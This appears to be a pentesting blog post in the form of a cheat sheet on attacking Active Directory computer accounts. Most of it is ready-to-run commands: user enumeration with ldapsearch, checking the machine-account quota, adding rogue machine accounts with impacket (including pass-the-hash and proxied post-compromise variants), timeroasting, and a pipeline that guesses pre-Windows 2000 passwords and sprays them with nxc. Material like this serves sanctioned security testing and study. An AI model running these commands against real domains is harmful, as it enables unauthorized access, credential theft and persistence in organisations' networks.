---
title: "AD Computers"
date: 2025-11-11 00:00:00 +0800
categories: [AD-Attacks]
tags: [Computers]
platform: AD-Attacks
author: 0xmr
image: /assets/img/posts/computer.jpg
excerpt: "Technical understanding and practical overview"
---

# AD Computers
> Active Directory Domain Services (AD DS) manages users, computers, and data, allowing administrators to organize resources into logical hierarchies and centralize access control. Key components include the Domain Controller (DC), which hosts AD DS and handles authentication requests, Organizational Units (OUs) for logical grouping, the Global Catalog for object discovery, and the Schema that defines object types and their attributes.

## Creating a List of Users
The following command helps you extract computer and user names from the domain using `ldapsearch`:
```bash
ldapsearch -x -H ldap://$IP -D "<user>@<domain>" -w '<password>' -b "<base_name>" -s sub '(objectClass=user)' | grep -i samaccountname | awk -F' ' '{print $2}'
```

## Creating Machine Accounts

### Check the MachineAccountQuota
This attribute defines how many machine accounts a user can create in the domain.  
By default, the limit is **10**.
```bash
nxc ldap $DOMAIN -d $DOMAIN -u $USER -p $PASS -M maq
# or
bloodyad -d $DOMAIN -u $USER -p $PASSWORD --host $DOMAIN_CONTROLLER get object 'DC=acme,DC=local' --attr ms-DS-MachineAccountQuota
# or
ldapsearch -x -H ldap://$ip -b 'DC=acme,DC=local' -D "$USER@$DOMAIN" -W -s sub "(objectclass=domain)" | grep ms-DS-MachineAccountQuota
```

### Creating Machine Accounts
```bash
# Password Authentication
impacket-addcomputer -dc-ip domain-controller-ip -computer-name supercomputer -computer-pass 'SuperStrong#!' 'domain/username:password'

# Post-compromise via proxy host
proxychains -q impacket-addcomputer -dc-ip domain-controller-ip -computer-name supercomputer -computer-pass 'SuperStrong#!' 'domain/username:password'
```

```bash
# Pass-The-Hash
impacket-addcomputer -dc-ip domain-controller-ip -computer-name supercomputer -computer-pass 'SuperStrong#!' -hashes lm-hash:nt-hash 'domain/username'

# Post-compromise via proxy host with Pass-The-Hash
proxychains -q impacket-addcomputer -dc-ip domain-controller-ip -computer-name supercomputer -computer-pass 'SuperStrong#!' -hashes lm-hash:nt-hash 'domain/username'
```

## Abusing Machine Accounts

### Timeroasting
```bash
nxc smb $Domain -u '$user' -p '$pass' -k -M timeroast
```

### Pre2k Enumeration
```bash
nxc ldap $Domain -u $user -p $pass -M pre2k
```


Resource used from [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers)
```bash
# 1. Find pre-created accounts that have never logged on
ldapsearch-ad -l $LDAP_SERVER -d $DOMAIN -u $USERNAME -p $PASSWORD -t search -s '(&(userAccountControl=4128)(logonCount=0))' | tee results.txt

# 2. Extract the sAMAccountNames from the results
cat results.txt | grep "sAMAccountName" | awk '{print $4}' | tee computers.txt

# 3. Create a password wordlist matching the Pre-Windows 2000 format (based on account names)
cat results.txt | grep "sAMAccountName" | awk '{print tolower($4)}' | tr -d '$' | tee passwords.txt

# 4. Brute-force line by line (user1:password1, user2:password2, ...)
nxc smb $DC_IP -u "computers.txt" -p "passwords.txt" --no-bruteforce
```
